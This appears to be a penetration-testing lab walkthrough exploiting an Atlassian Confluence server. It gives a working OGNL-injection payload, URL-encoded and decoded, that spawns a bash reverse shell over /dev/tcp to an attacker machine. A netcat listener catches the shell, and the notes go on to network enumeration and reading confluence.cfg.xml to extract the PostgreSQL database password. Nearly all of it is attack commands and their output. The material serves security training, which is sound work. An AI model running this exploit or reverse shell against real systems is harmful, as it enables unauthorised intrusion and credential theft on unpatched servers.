# Setting Up the Lab Environment

The example payload from the Rapid7 blog post
>``` shell
>curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
>```

The example payload URL-decoded
>``` shell
>/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
>```

The example payload URL-decoded
>``` shell
>curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
>```

Starting Netcat listener on port 4444 on our Kali machine
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
># =====================================
>```

Executing the modified reverse shell payload
>``` shell
>kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
>```

Bash reverse shell caught by our Netcat listener, and confirmed with the id command
>``` shell
>...
>listening on [any] 4444 ...
>connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
>bash: cannot set terminal process group (813): Inappropriate ioctl for device
>bash: no job control in this shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ id
>
># ========== Expected Result ==========
>id
>uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
># =====================================
>```

Enumerating network interfaces on CONFLUENCE01
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
>
># ========== Expected Result ==========
>ip addr
>1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
>    inet 127.0.0.1/8 scope host lo
>       valid_lft forever preferred_lft forever
>    inet6 ::1/128 scope host 
>       valid_lft forever preferred_lft forever
>2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
>    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
>    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
>       valid_lft forever preferred_lft forever
>    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
>       valid_lft forever preferred_lft forever
>3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
>    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
>    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
>       valid_lft forever preferred_lft forever
>    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
>       valid_lft forever preferred_lft forever
># =====================================
>```

Enumerating routes on CONFLUENCE01
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
>
># ========== Expected Result ==========
>ip route
>default via 192.168.50.254 dev ens192 proto static 
>10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
>10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
>192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
># =====================================
>```

The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
>
># ========== Expected Result ==========
><sian/application-data/confluence/confluence.cfg.xml   
><?xml version="1.0" encoding="UTF-8"?>
>
><confluence-configuration>
>  <setupStep>complete</setupStep>
>  <setupType>custom</setupType>
>  <buildNumber>8703</buildNumber>
>  <properties>
>...
>    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
>    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
>    <property name="hibernate.connection.username">postgres</property>
>...
>  </properties>
></confluence-configuration>
>confluence@confluence01:/opt/atlassian/confluence/bin$ 
># =====================================
>```
